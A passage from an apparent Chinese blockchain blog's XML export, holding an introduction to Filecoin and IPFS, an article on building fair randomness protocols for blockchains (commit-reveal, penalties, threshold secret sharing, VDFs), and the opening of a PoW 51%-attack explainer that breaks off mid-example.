    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第一章介绍filecoin概念。 filecoin的定义 Filecoin是一个去中心化的存储网络（DSN），是一个云存储的自由交易市场，通过Filecoin项目来实现其协议。矿工通过提供数据存储或检索来获得token（也称为“filecoin”）。相反，客户向矿工支付token以存储或分发数据并进行检索。 Filecoin的多重含义： 网络 市场 项目 协议 Token filecoin的设计目的 filecoin设计符合激励相容，每一个参与者的最有利可图的选择（包括目标客户，矿工，投资者和开发人员）将是采取行动提高网络服务质量，这也是他们的最优策略。 以超高竞争力的价格可靠地存储文件（低成本、高效率） 客户可以调整其存储策略以满足他们的需求，在冗余，检索速度和成本之间创建自定义平衡。全球的Filecoin存储和检索市场使供应商竞争以最优惠的价格为客户提供灵活的选择 filecoin与IPFS的关系filecoin与IPFS属性对比 类别 IPFS Filecoin 功能 基于内容寻址的分布式存储基础设施 IPFS网络之上的激励层，提供一个云存储领域的自由交易市场 对标对象 HTTP 大型集中式孤岛存储提供商，如国外的aws、国内的aliyun等 存储权限 对有所有权的IPFS节点具备存储权限 1 除对有所有权的IPFS节点具备存储权限外2 还可以通过支付的方式，在其供应商的节点之上具备存储权限 读取权限 ALL（只要知道内容cid） ALL（只要知道内容cid） 架构设计 另行文章补充分析 原则上需要无缝对接到IPFS1Filecoin将IPLD用于区块链数据结构2 Filecoin节点使用libp2p建立彼此的安全连接3 节点和Filecoin块传播之间的消息传递使用libp2p pubsub 使用场景 1 存储自己的节点数据，分享数据等，类似BT2 基于IPFS或其中部分组件构建企业自己的分布式云存储架构、区块链架构等 1 成为filecoin矿工，提供分布式检索及存储服务2 成为filecoin客户，支付费用享受filecoin网络的检索及存储服务3 基于filecoin，开发第三方管理系统 IPFS现在和将来都可以免费下载，运行和使用，并且将独立于Filecoin运行。一旦Filecoin正式网络启动，IPFS节点还可以免费或利润地在Filecoin检索市场上提供其文件的检索。 IPFS的对标对象 特点 HTTP IPFS 寻址方式 位置寻址一维寻址，低效、脆弱 内容寻址多维寻址，高效、稳定 效率 低效 高效 稳定性 脆弱 稳定 开放性 封闭、垄断 开放、共享 filecoin的对标对象 特点 传统云存储提供商（大型集中式孤岛存储网络） Filecoin 网络模式 集中式 DSN 加入门槛 高，从硬件底层基础设施、一直到软件、服务的提供，小企业很难插足 低、自由交易市场，Filecoin做好基础设施 宏观视野：闲置存储空间 高 低 价格 昂贵，垄断、可人为保持高水平 便宜，自由竞争市场 安全性 差，破坏隐私1 云存储上可查看用户隐私2 甚至许多密码鉴权信息都没有隐私可言3 单个提供商的故障影响大 强1 无第三方或者中心机构，文件加密安全得到保障2 单个云提供商的故障小 利益分配群体 巨头 All filecoin网络中的角色 角色 说明 主要影响因素 存储矿工 存储矿工通过为客户存储数据来获得Filecoin；获得区块奖励和交易费用的概率与矿工对Filecoin网络的存储量成正比 存储容量 检索矿工 检索矿工的带宽和交易的出价/响应时间（即延迟和与客户的接近度）将决定其在网络上关闭检索交易的能力 带宽 检索客户 支付filecoin获取检索服务 存储客户 支付filecoin获取存储服务 矿工收益方式类比理解 类比filecoin为一家股份公司，类比存储矿工为股东（股份出资人） 收益来源 类比分析 提供存储服务 存储矿工收益来自两部分1 工资（提供存储并收取服务费用）2 按照出资比例分红（区块奖励就是按照有效存储占比来实现的） 提供检索服务 检索矿工是offchain的，不参与挖矿，收益来自1 工资（提供检索并收取服务费用） 存储矿工存储两类数据，存储整个区块链所需的总存储量将远低于矿工为交易存储的密封数据。 密封客户的存储数据 blockchain数据的数据的副本 检索矿工 提供检索的途径 可以存储热门数据（非存储矿工），以便更优质提供服务 自己同时做存储矿工，或者从存储矿工处获取 不限于从filecoin网络获取，可以从免费的IPFS网络获取 检索效率的保证- 检索矿工是不运行在blockchain中的，是off blockchain的。 - 全球分布式 客户(检索客户和存储客户)选择filecoin的理由 企业客户愿意使用filecoin来支付数据存储和检索的理由 filecoin是一套激励相容的系统，filecoin的设计目标保证了每个参与者（包括客户，矿工，投资者和开发人员）的最有利可图的选择或者说是最优策略是采取行动来提高网络的服务质量。具备技术先进性。 数据更为安全 抵押机制促使矿工提供稳定安全服务，预计会出现声誉系统。矿工需要自行保证系统内的稳定性。 即便提供商出现故障，filecoin网络可以在多个存储提供商之间进行额外的修复。 客户可以根据数据安全等级选择副本数量。 价格更为廉价 内容寻址的本质决定了其全局冗余度低。 filecoin作为全球性的分布式存储系统，可以做全球性去重，从而降低整个网络存储成本。 个人客户选择使用filecoin的理由 预计filecoin将提供允许一方支付另一方来检索数据的结构 包括web 2.0网站的主要内容分发模型，在该模型中，网站所有者为基础设施服务付费，以免费向其用户提供数据，然后以其他方式通过内容获利。 filecoin的设计目标，让用户和内容创作者能够探索各种新的内容分发和经济模型。 例如版权问题的解决 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链上的随机性（一）概述与构造]]></title>
    <url>%2F2019%2F01%2F26%2Frandomness-blockchain-1%2F</url>
    <content type="text"><![CDATA[本篇文章总结了目前主要的应用在区块链的不可预测随机数获取协议，并提炼出它们的设计思想，方法论以及依赖的假设，然后对他们进行比较。本文分为两部分：第一部分介绍基本概念，并从零开始构造适用于分布式系统的随机数协议核心；第二部分介绍目前主流的应用在区块链项目中的随机数协议，并分析他们是如何使用第一部分所介绍的某类或者某几类协议核心。 本文假设读者已经具有基本的区块链知识，并对以太坊智能合约的基本原理和比特币共识协议的基本原理有大致的了解。 随机性 (Randomness) 的获取是区块链中很重要并且比较困难的一个课题。这里的随机性的获取包括但不仅限于：如何在智能合约中引入不可预测的随机数；如何在共识协议中安全地进行随机抽签。显然，上述对于随机性获取的问题描述已经说明了为何这个课题十分重要。而它的困难之处一方面来自于区块链系统的透明性——从通常意义上来讲，该特性会使得一切算法的输入，输出以及算法本身暴露给所有的系统参与者——因此，在密码学中广泛使用的伪随机数发生器不可以被直接以硬编码的方式或者是智能合约代码的方式应用在区块链系统中来获取安全的随机数。另一方面，随机数获取协议作为区块链系统的一个子协议常常与该系统下的其他协议有着强耦合的特性——例如，共识协议——也就是说，其他协议很有可能会影响随机数获取协议的安全性。这会使得随机数获取协议的设计变得非常复杂，常常需要具体问题具体分析。 随机性的定义在日常生活中，我们经常会听到诸如“随机选择”，“伪随机数”，“随机模型”，“随机序列”之类的词汇，以及“伪随机数”、“真随机数”这样的概念。想要理解这些词汇和概念，必须要搞清楚随机是什么。事实上，与随机相对的是确定，因此，我们可以将随机直观上理解为不确定——无论是随机数，还是随机选择，我们都希望这个数或者选择的结果从某种程度上来讲是不确定的。因此，如果直接给出一个数，而不给出这个数的产生方式，它不能被称之为随机数，比如直接给出一个数字 1，我们不能说 1 是随机数，但是如果这个 1 是通过掷骰子决定的，则可以说这个 1 是随机的。当然，这些都是非常直观而宽泛的理解。更精确地讲，“随机”，或者我们说“随机数”、“随机序列”，在不同的领域有不同的定义。在数学上，随机数的定义和概率论相关，计算复杂性理论使用描述随机序列的程序长度来定义，密码学会结合统计特性和密码攻击来描述随机数。我们这里先给出随机序列的描述性定义： 我们可以称一个序列为随机序列，当它满足： 均匀性：该序列服从均匀分布。 独立性：该序列的各个元素相互独立。 不可预测性：依据该序列的任意片段，不能预测该序列余下的部分。 展开来讲，我们可以先考虑如下问题： 考虑一个每一项要么取 1 要么取 0 的数列。假设它的每一项均为1，它显然不是随机序列，因为违反了均匀性。均匀性要求0和1出现的概率相同。 假设它的每一项都和前一项不相等。比如 “0101010101”，它满足了均匀性，但是仍然不是随机序列，因为违反了独立性。 对于一个满足独立性和均匀性的随机序列。比如从常数 $e$ 的小数点后第 10 位开始依次选取数码组成序列。这样的序列在统计上满足独立性和均匀性，但是它的序列是可以被预测的。 我们说过，不同的领域对随机性有不同的定义。比如，在仿真当中我们想要模拟顾客到达的间隔时间，用只满足前两条的随机序列是足够的。但是在密码学中，比如生成随机的密钥，仅满足前两条的随机序列是不够的，一个有可能被预测的随机序列用在密钥生成中当然是有安全问题的。比如我们用自然对数的底 $e$ 的数码作为随机序列。$e$ 确实可以被认为在统计上是均匀分布和独立的（尽管没有完全证明），用来做仿真是足够的，但是不能用作密码学中的随机种子。因为对手有可能通过一定长度的已知序列猜测到是在使用 $e$ 。另外，在抽奖，游戏当中使用的随机数也通常是要求不可预测的。鉴于区块链领域中涉及的多是密码学和游戏的场景，接下来的内容都是满足全部三条性质的随机序列。 随机序列又可以被分为真随机 (True Random) **序列和伪随机 (Pseudorandom) 序列。**伪随机序列，顾名思义，就是“不是真的随机，只是看起来是随机的”。因此，根据图灵奖得主姚期智先生 [1] 提出的概念，粗略地讲，伪随机序列就是指一个与真随机序列在计算上不可区分的序列。而真随机序列，粗略地讲，指的是不可被重现的随机序列，比如通过抛硬币产生的随机序列。我们可以看出来，在这样的定义下，伪随机序列的统计特性应当和真随机序列无法区分，也就是说，伪随机序列同样是满足全部三条性质的随机序列。当然，这样的定义通常用在计算复杂性理论以及密码学当中，在其他领域，只满足前两条性质的随机序列也可以被称作伪随机序列。 产生随机序列的发生器叫做随机数发生器 (Random Number Generator, RNG) 。按照产生的序列的性质，我们可以将其分为真随机数发生器 (True Random Number Generator, TRNG) **和伪随机数发生器 (Pseudorandom Number Generator, PRNG)**。此外，还有一种与之正交的分类方法是从随机数发生器的实现方法来分类，可以将随机数发生器分为硬件随机数发生器和软件随机数发生器，它们之间的关系如 下图1 所示 图1：随机数发生器的分类 真随机数发生器通常利用一些非确定现象，通过物理手段将其转换为真随机序列。通常的非确定现象包括混沌效应和量子随机过程。其中混沌效应的特点是目前物理学能够明确解释其因果，但是由于结果对于初始值过于敏感，导致无法精确预测其结果。比如，通过收集大气噪声而产生的随机数。而量子随机过程则是利用微观量子态的不确定性，这个不确定性已经被目前物理学理论承认，它能够保证即使输入值完全相同，输出值也是可能完全不同的。比如利用激光器的相位噪声来生成随机数。硬件真随机数发生器，通常使用芯片实现；而软件真随机数发生器，通常利用系统自带的一些非确定现象，譬如硬盘寻道时间、RAM 中的内容或者是用户的输入，Linux 系统里的/dev/random就是一种软件真随机数发生器，它通过采集机器运行过程中的硬件噪音数据来获取足够的随机性来源，并依此生成随机数。 伪随机数发生器是一段程序，是一种确定性的算法，通常以短的真随机数作为输入，进行扩充，生成更长的和真随机序列非常接近的随机数序列。它的输入被称作种子 (Seed)。它同样也有硬件实现和软件实现。 如何从区块链上取得随机数上一节中我们给出了随机性的一个定义，这样的定义也将用于本文余下的部分。并且，我们还给出了伪随机性以及伪随机数发生器的概念。在实际应用中，可用于密码学的伪随机数发生器有很多并且也已经很成熟了，那么我们很自然地想到，能否将伪随机数发生器用于区块链，在区块链的共识过程或者应用上面加入随机性，使得这样的随机性满足我们上面提到的三条性质？显然，答案是否定的。伪随机数发生器产生的随机序列的不可预测性的前提是伪随机数发生器作为一个黑盒，除了它的输出，外界无法得知其他一切信息。但是区块链上的一切都是公开透明的，包括使用的伪随机数发生器及输入到伪随机数发生器里面的种子也是一样公开透明的。在这样的情况下，所有传统的伪随机数发生器都无法在区块链的环境下产出具有不可预测性的随机数序列。而至于真随机数发生器，是存在将真随机数发生器的结果通过可验证的不可篡改的通道，引入区块链系统内部，这样的通道又被称作 Oracle。以太坊现在常用的随机数发生器就是通过 Oracle，引入 random.org（random.org 是一个网站，它声称提供真随机数）提供的随机数。这种方法的问题在于，所谓的“真随机数发生器”往往是中心化的，拥有这样的硬件或者软件的人或者组织拥有篡改随机数发生器结果并不让用户发觉的能力。这对于主打去中心化的区块链系统来说，无疑是如鲠在喉。 除了伪随机数发生器和真随机数发生器，还有一类直接利用区块链系统中共识过程所天然产生的随机性。比如，使用未来某个块或者之前某个块的 Hash 值来作为种子之一生成随机数（其他的种子可以是用户的地址、用户支付的以太币数量等，但是这些是用户可控的部分，没有增加不可预测性的作用）。这种做法也常见于各种区块链博彩类游戏以及资金盘游戏当中，但是这样的随机数获取过程有着致命的漏洞——用户有可能通过仔细选择交易时间来控制随机数向有利于自己的方向生成；即使用户无法控制，矿工也可以控制随机数的生成，并且这样的攻击成立并不需要太多算力的参与。只要最终随机数牵涉的金额足够，完全可以使用租用算力或者贿赂矿工的方式进行攻击。 那么归根结底，在区块链这样的一个系统当中随机性可以来自哪里呢？也就是说，通过上面的分析，我们发现，无论规则或者程序设计得如何复杂，它都是确定性的算法。对于一个确定性的算法，算法本身不会对输出的随机性有任何的影响，能够影响最终输出的随机性的，只有算法的输入。因此，在区块链系统当中，我们需要在一个分布式的，公开透明的环境中去仔细选择一个有足够随机性的输入。这样的输入实际上来源于我们对于区块链系统参与者之间不是一个整体的假设。 随机数生成协议模型我们现在从最简单的情况开始去逐步构造一个区块链上可以使用的公平的随机数发生器。下文所涉及到的在分布式的环境下的协议都可以转换为区块链的环境，因此不对“分布式”和“区块链”做区分。 “分布式”和“区块链”的区别 区块链系统属于分布式系统，但是分布式系统不仅仅是区块链系统，还包括点对点文件传输系统，分布式数据库系统等等。“分布式”只是对网络的拓扑结构进行描述，表明网络不是集中式的，而是分布的多节点控制的。 为了更清楚地说明构造分布式随机数协议，也叫分布式随机数信标 (Distributed Randomness Beacon, DRB)，的方法论，我们首先引入一个随机数协议的抽象模型： 图2： 随机数协议的抽象模型 这个模型能够完整地描述一个分布式随机数协议的输入输出与其节点之间的关系。如上图2所示，假设每个节点地位相同，不做区分，那么每个节点都会运行同样的协议。一个分布式随机数协议包含三部分的输入：每个节点 $i$ 自己的输入 $I_{self}^i$ ，来自其他节点的输入 $I_{inter}^i$ ，$j≠i$ 以及一个公开的预先约定好的公共输入 $I_{common}$，这三部分输入每一部分都可以包含多次的输入。作为一个分布式随机协议，其输出随机性的来源只能由输入提供，我们先不考虑这三部分输入进入协议的先后顺序，那么我们可以将协议分为两类，一类是采用 $I_{self}$ 与 $I_{inter}$ 作为随机性来源的协议，另一类是采用 $I_{common}$ 作为随机性来源的协议，大家可以发现，这两类事实上已经涵盖了所有的随机性来源的可能，其他类别的协议都可以视为这两类协议的组合。文章后面的部分将主要对这两类协议展开分析。 采用 $I_{self}$ 与 $I_{inter}$ 作为随机性来源下面，我们考虑这样的一个场景：Alice 和 Bob 在网上凑钱一起买了一张彩票，结果中了神秘的头奖，令他们吃惊的是，奖金竟然是一只他最喜欢的卡通皮卡丘，如下图 3 所示。但是奖品不可分割，并且由于两人相隔甚远无法见面猜拳，所以他们俩决定设计一个对两个人都公平的随机数生成协议来确定谁能获得这份奖品。 图3: 动漫奖品 v1.0：最简单的随机数生成协议Alice 设计了如下图 4 所示的一个协议，这个协议又被称作(抛硬币协议) Coin-Tossing Protocol 或是 Coin-Flipping Protocol。协议接收每位参与者的一次输入，在该场景下是 $ ξA $ 和 $ξB$，输入的取值只能是 0 或者 1。协议拥有唯一公共输出 $ξ$，取值也是 0 或者 1，如果最后 $ξ =0$，Alice 获得奖品；若 $ξ=1$， Bob 获得奖品。而从每一位参与者的角度来讲，这个协议接收自己的输入以及其他运行这个协议的节点的输入，经过算法运算之后，输出一个一致的最终结果，其实就是上一节中我们提到的抽象模型中的，利用 $I_{self}$ 与 $I_{inter}$ 作为随机性来源的协议。 图 4：抛硬币协议 Coin-Flipping 或 Coin-Tossing 协议 那么这样的协议具体是怎么做的呢？为了构造这样的一个协议，我们需要确定这样的协议需要满足什么样的性质。考虑到每个人之间的输入是相互独立的，这样的协议需要保证每个人自己的输入也应当是和输出相互独立的，但是他们又共同对输出做出了一定贡献。只有这样，才能确保每个人都无法光凭借改变自己的选择来改变输出。同时，协议也需要保证只要有一个人的输入是均匀分布的，那么结果就是均匀分布的。现实中满足这些条件的构造方式有很多，其中一种是异或操作，将两人的输入异或之后输出：在给定 Bob 选 1 的情况下（Alice 不知道），Alice 不管选 0 还是 1，输出结果都是 0 和 1 各一半的可能性；给定 Bob 选 0 的情况同理。$$ξ=ξA⊕ξB$$ 另一种方法是利用 mod 加法，将两人的输入进行模 2 加法之后输出。$$ ξ = ξA + ξB\quad mod\ 2 $$ v2.0：带有承诺的版本v1.0 看似解决了我们的问题，实际上它有非常大的漏洞。这个漏洞在于，我们无法保证 Alice 和 Bob “同时” 输入。假如 Bob 等 Alice 向协议输入她的选择之后再进行选择，那么由于协议的交互对于两人来讲是公开的，Bob 可以根据 ALice 的选择来调整自己的选择。例如，如果 Alice 的选择是 0，那 Bob 就输入 0；如果 Alice 是 1，那他就输入 1。这样，无论 Alice 怎么选择，Bob 都可以使得异或的结果永远是 1，就能拿走这奖品。 图 5：带有承诺的 抛硬币协议 Coin-Tossing 事实上，同时输入是很难保证的，而为了防止这种作弊行为，我们需要保证，协议的来自其他人的输入对于参与者来讲应该是暂时机密的，不会透露任何他们的选择的信息。与此相应的，应该多出一个去机密化的过程以计算出协议的输出。为了实现这样的需求，我们需要引入新的机制：承诺 (Commitment)。如上图 5 所示，该机制包含两个阶段：承诺 (Commit) **阶段和揭示 (Reveal) **阶段。在第一个承诺阶段，协议参与者不再直接输入自己的选择，而是对自己的选择进行数字签名，将签名的结果，我们称之为承诺，输入进协议。例如，Alice 会将她的选择 $ ξA $ 用自己的私钥 $skA$ 进行签名，获得结果 $sig_{skA}(ξA )$ 输入进协议。当所有参与者的签名结果均输入进协议中后，进入第二个揭示阶段。该阶段所有参与者将第一轮自己的选择输入进协议，例如 Alice 会输入 $ ξA $。协议会结合第一个阶段的承诺进行验证，如果所有的验证都通过，则输出最终结果 $ ξ $，最终结果就是我们想要的随机数。 这样的协议保证了，在第一个阶段里没有任何人的选择会被除自己以外的其他人获知，并且在第二阶段，即使 Bob 先知道了 Alice 揭示出来的选择值然后在自己揭示之前计算出结果，他也无法改变自己的选择了，因为第一个阶段的签名已经做出了“承诺”。这里，数字签名能够保证消息的不可篡改性，不可否认性以及暂时的机密性。如果该协议是运行于区块链之上，由于通常区块链协议都会对交易内容进行数字签名，那么我们的协议也可以将使用数字签名改为使用 Hash 函数。 v3.0a：使用经济惩罚v2.0 的版本在对于两个人的情况的时候看起来非常公平，但是对于两人以上的情况，它仍然是有漏洞的。假设 Alice、Bob、Clare 三个人分奖品，其他设定不变，采用 v2.0 协议。这时，Bob 想到了个主意：“在最后的第二阶段，我可以在输入自己的选择进行揭示之前先依据别人的揭示结果计算出输出，如果不是对我有利的输出，我就不进行揭示阶段，假装网线被挖断了。” 刚才的协议无法处理这种情况。是重新再来一遍，还是就取剩下两个人的输入呢？这两种方法是都有问题的：如果重新再运行一遍协议，那么攻击者就可以利用这种重新运行的机制在每次自己不利的情况下强行使得协议重新运行；如果只取剩下两个人的输入，攻击者同样可以利用这种机制选择是否放弃输入来趋利避害。因此，我们需要有一种机制来保证参与者不得随意放弃，最简单的方式就是利用经济惩罚。如下图 6 所示，当参与者在第一阶段承诺的时候，必须要向协议锁定一个比特币（也可以是其他的数字货币）——如果是在带有智能合约的区块链的环境，这样的操作十分容易。如果 Bob 不按时揭示他的选择 $ ξB $ ，那么就会没收 Bob 的比特币分给 Alice 和 Clare，然后重启协议。由于奖品的价值（也许）通常并不会超过一个比特币，Bob 不会选择这样的方式进行作弊。这样的一个惩罚机制，就是为了防止这样的拒绝服务攻击。 图 6：带有经济惩罚的版本 需要注意的是，之所以本节一开始所述的攻击对只有两个参与者的协议不奏效，是因为两个人的情况下，在仅剩一个人的时候，我们可以直接给出有利于剩下的参与者的结果，而在多于两个人的情形下，我们仍旧无法保证在剩下的人当中做出选择。这样的规则是一种天然的对拒绝服务的参与者的惩罚。 v3.0b：使用门限机制除了经济惩罚之外，还有另外一种方式，我们称之为门限 (Threshold) 机制。门限机制指的是一种协议的某一个指标达到一定阈值就可以执行特定流程的机制。在这里我们引入门限机制，主要是为了使得在协议参与人数有缺失的时候仍然能够给出正常的输出。门限机制的作用在于增强协议的健壮性，使得它能够容忍一定程度的拒绝服务攻击。我们接下来讨论的门限机制都是 $(t,n)$ 门限机制，意思就是对于 $n$ 个参与者的协议，只需要 $t$ 个参与者的输入即可完成协议的输出，注意这里的 $n$ 不一定是协议预先规定好的，或者说是协议必须知道的，它也有可能是一个不确定的数字。如果协议必须规定了确切的 $n$ 才能够保证正确性，那么这样的协议只能用于许可环境 (Permissioned Setting) 中；如果不需要规定确切的 $n$，那么这样的协议可以被用于非许可环境 (Permissionless Setting) 中。如图 7 和 图 8 所示，我们使用最基本的 v1.0 版本的 Coin-Tossing 协议，将门限机制的输出作为 Coin-Tossing 协议的输入。这样的门限机制总的说来有三种。 图 7：Coin Tossing 抛硬币协议 图 8：带门限机制的 Coin Tossing 抛硬币协议 第一种门限机制是将输入按照某种规则排序之后，简单地取前 $t$ 个输入。但是这种方式不抗女巫攻击 (Sybil Attack)——假如 Bob 是黑客帝国的复制人，他复制了一万个自己，因此 Bob 通过控制这一万个身份有很大的可能占有前 $t$ 个输入，从而控制随机数的结果。因此，这种门限机制是无法用在没有抗女巫攻击机制的环境下——譬如，没有身份验证的非许可环境下。它的优点在于，这样的机制不需要知道 $n$ 的确切值。 女巫攻击简单来讲，指的是一种网络内的少数节点控制多重身份以消除冗余备份的作用的攻击方式 第二种门限机制是无分发者的秘密分享系列的。秘密分享可以将一个秘密分成多个碎片，只有集齐一定数量的碎片才能将秘密恢复出来。通常，秘密分享需要有一个可信第三方充当分发者将秘密分成秘密碎片然后分发。而无分发者的含义则是秘密分享的过程不需要这样的分发者，也就是说，更加去中心化了。它一般有三种不同的形式：第一种是无分发者的秘密分享 (Secret Sharing)；另一种是无分发者的可验证秘密分享 (Verifiable Secret Sharing)；最后一种是无分发者的公开可验证秘密分享 (Publicly Verifiable Secret Sharing)。当然，这三种方式是有区别的。第一种无法验证，秘密碎片可以被伪造。第二种的秘密碎片可被验证，但是验证不是每个人都可以做的，每个人只能验证自己的那一份碎片。最后一种是可被公开验证的，每个人都可以验证所有的秘密碎片。这三种方式均需要每产生一个随机数输出都进行一次秘密分享来保证门限机制，属于有状态 (Stateful) 协议。更直观地讲，比如有 $n$ 个人，假设只需要有 $t$ 个人提交了就能输出我们想要的随机数，同时，我们需要 $r$ 个这样的随机数。那么如果采用无分发者的秘密分享系列的门限机制，我们需要这 $n$ 个人相互交互至少 $r$ 轮。另一个局限是，该方案需要在许可环境下实施，也就是说协议必须知道总人数 $n$，才能确定合理的门限 $t$。 我们这里仅介绍第一种形式和第三种形式。如下图 9 所示，第一种形式——无分发者的秘密分享——首先要分发，比如说 Bob 把他的选择 $ ξB $ 分成三份：$s_{ξB}^A$ ，$s_{ξB}^B$， $s_{ξB}^C$ ，这三份中的任意两份都可以恢复出完整的 $ ξB $ 。上角标代表了这个份额发送给的人，例如 $s_{ξB}^C$ 表示该份额发送给 Clare。每个人都像 Bob 这样做之后，每个人手上都有 3 份来自包括自己在内的不同的人的份额。例如，Clare 此时手上应该有 ：$s_{ξA}^C$ ，$s_{ξB}^C$，$s_{ξC}^C$ 。此时，每个人再把这些份额拼成份额向量广播给所有人。例如 Clare 会将份额向量 $$s^C = [s_{ξA}^C ，s_{ξB}^C，s_{ξC}^C]$$ 广播给其他两个人。这样每个人只要手里有包括自己在内的两份这样的向量就能恢复出 Alice、Bob 和 Clare 三人的选择，然后就可以算出最终的随机数，例如 Bob 拥有向量 $$s^B = [s_{ξA}^B ，s_{ξB}^B，s_{ξC}^B]$$ 和 $$s^C = [s_{ξA}^C ，s_{ξB}^C，s_{ξC}^C]$$ 下角标相同上角标不同的任意两个份额都可以恢复出相应的秘密，例如 $s_{ξB}^B$ 和 $s_{ξB}^C$ 可以恢复出$ξB$。由于这一点，我们可以得到 $[ξA,ξB,ξC]$，由此算出最终的结果 $ξ$。 图 9：无分发者的秘密分享 但是这样的秘密分享方案是有漏洞的，如果秘密分发者——譬如 Bob——在分发份额 $s_{ξB}^A$ ，$s_{ξB}^B$ ，$s_{ξB}^C$的时候，将其中一份份额 $s_{ξB}^A$ 替换为其他的一个任意值，那么收到这个份额的 Alice 在使用该份额进行恢复的时候有可能恢复出错误的 $ ξB $。为了防止这样的攻击，我们需要可验证的秘密分享方案。 如图 10 所示，第三种形式——无分发者的公开可验证秘密分享——与第一种相比则是在分发阶段的时候多了一些额外的数据。这些数据就是“证明”，记作$π$。“证明” $π$ 可以被用来检验每个人收到的份额是否和其他人的一致。所有人都会使用这个公开的 $π$ 去验证收到的份额，验证通过就可以说明这个份额确实是和其他发出去的份额是一致的，都是按照正确的规则生成的。 图 10：无分发者的公开可验证秘 第三种方法是分布式密钥生成 (Distributed Key Generation) + 门限签名 (Threshold Signature)。门限签名可以理解为秘密分享应用到了数字签名方案中，但是它又不是单纯将两者相叠加。通常的数字签名方案是，一个人用自己的私钥加密了消息获得签名之后，签名可以被公钥等公开参数验证。而该方案使用的门限签名方案里同样有一对公私钥，但是每个参与者分别只有总私钥的其中一个碎片以及相应的公钥碎片；这些私钥碎片集合起来可以恢复出完整的私钥，公钥碎片同理；每个人可以利用自己的私钥碎片进行签名获得签名碎片，这些签名碎片可以被公钥的相应碎片验证；并且，这些签名碎片中的任意 $t$ 个合起来可以计算出一个总签名，该总签名相当于用总私钥进行签名，因此也能被总公钥验证。故而这样的签名过程并不需要所有人参与，只需要 $n$ 个人中的 $t$ 个人的有效签名即可完成签名过程。而且无论是哪 $t$ 个人参与签名，最后生成的签名是一样的。并且签名过程中涉及到的私钥不会被泄露，每个人分享的只有公钥碎片和自己的签名结果，这使得多轮无交互签名成为可能。当然，这个总的公私钥对以及相应碎片不是任意选取的，它的生成需要所有的 $n$ 个人在协议第一次运行时运行分布式密钥生成协议才能生成有这样的密码学特性的公私钥对及其碎片。因此，这个方案同样存在协议必须要知道总人数 $n$ 的问题。 使用 $I_{common}$ 作为随机性来源使用 $$I_{common}$$ 作为随机性来源，最常见的方法是采用比特币链上未来某一个块的 Hash 值作为 $$I_{common}$$ ，或者使用当日股票市场上某一支股票的收盘价。但是这个方法的问题在于，输出 $O$ 完全由 $$I_{common}$$ 计算得来，攻击者有可能通过操纵 $$I_{common}$$ 的值来使得 $O$ 变为他想要的值。如果从 $$I_{common}$$ 计算$O$的过程没有那么容易，比如说有可能要耗上一整天，那么攻击者将没有足够的时间去提前预测$O$的值。为了实现这样的需求，我们引入了一个新的密码学工具：可验证延迟函数 (Verifiable Delay Function, VDF) （参考[2]） 。这样的工具能够使得输出$O$在给定时间 $t$ 内是很难通过输入 $$I_{common}$$ 计算出的，即使拥有任意的并行处理器以及多项式级别的提前计算量。同时，输出 $O$ 是唯一的并且可以被公开验证是由 $$I_{common}$$ 正确计算得来的。它很像 PoW，但是 PoW 不抗并行处理器及多项式级别的提前计算攻击，也就是说，使用并行处理器能够显著缩小 PoW 的计算时间到远远小于 $t$。使用 VDF 可以保证在给定时间内全世界没有任何一个人可以预测与给定输入相匹配的输出。以太坊 2.0 已经计划使用 VDF 作为随机数信标。 参考文献[1] Yao, Andrew C. “Theory and application of trapdoor functions.” Foundations of Computer Science, 1982. SFCS’08. 23rd Annual Symposium on. IEEE, 1982. [2] Boneh, Dan, et al. “Verifiable delay functions.” Annual International Cryptology Conference. Springer, Cham, 2018. 本文依照 BY-NC-SA 许可协议转载，原文链接。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>随机数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链共识安全 - 51%攻击浅析]]></title>
    <url>%2F2019%2F01%2F09%2Fconsensus-security-51%2F</url>
    <content type="text"><![CDATA[无论工作量证明的PoW，还是权益证明PoS，还是委托权益证明DPoS，只要在共识问题里面，理论上讲都无法避免出现 51% 攻击，攻击者通过51%可逆转区块，控制主网，导致双花。本文将详细介绍PoW机制，51%攻击过程，以及安全解决方案。 背景知识区块链作为一种去中心化的分布式公共数据存储系统，其并没有中央管理机构进行管理工作，而是通过分布式节点共同利用密码学协议共同维护，而各个节点在维护整个系统的时候要通过底层的共识协议来保证账本的一致性。区块链在不同的现实场景中发挥的实际用途不同，比如公链，私链，联盟链，不同的链使用的共识算法也有所不同，比如比特币使用的PoW共识，以太坊使用的PoW共识，EOS使用的DPoS共识，而不同的共识算法所涉及的安全性又有所区别。 本文将详细介绍比特币和以太坊使用的PoW共识协议中存在的攻击风险。 PoW共识机制首先让我们来看看什么是PoW共识协议。 从去中心化账本系统的角度看，每个加入这个系统的节点都要保存一份完整的账本，但每个节点却不能同时记账，因为节点处于不同的环境，接收到不同的信息，因此需要有共识来达成哪个节点有权记账。比特币和以太坊区块链通过竞争记账的方式解决去中心化的记账系统的一致性问题, 即以每个节点的计算能力即“算力”来竞争记账权的机制，在竞争记账权的过程就是“挖矿”。 然而，在一个去中心化的系统中，谁有权判定竞争的结果呢？比特币和以太坊区块链系统是通过一个称为“工作量证明”（Proof of Work，PoW）的共识机制完成的。 PoW(Proof of Work)，即”工作量证明”，简单地说，PoW就是一份确认工作端做过一定量工作的证明。工作端需要做一定难度的工作得出一个结果，验证方通过结果来检查工作端是不是做了相应的工作。 在通过工作量证明共识进行的挖矿行为中，需要遵守三个规则： 一段时间内只有一个人可以记账成功 通过解决密码学难题(即工作量证明)竞争获取唯一的记账权 其他节点验证并复制记账结果 举个例子，给定字符串“blockchain”，我们给出的工作量要求是，可以在这个字符串后面连接一个称为nonce的整数值串，对连接后的字符串进行SHA256哈希运算，如果得到的哈希结果（以十六进制的形式表示）是以若干个0开头的，则验证通过。为了达到这个工作量证明的目标，我们需要不停地递增nonce值，对得到的新字符串进行SHA256哈希运算。 123Hash(上一个Hash的值， 交易记录信息集合) = 29329385BNDH749Hash(上一个Hash的值， 交易记录信息集合， 随机数nonce) = 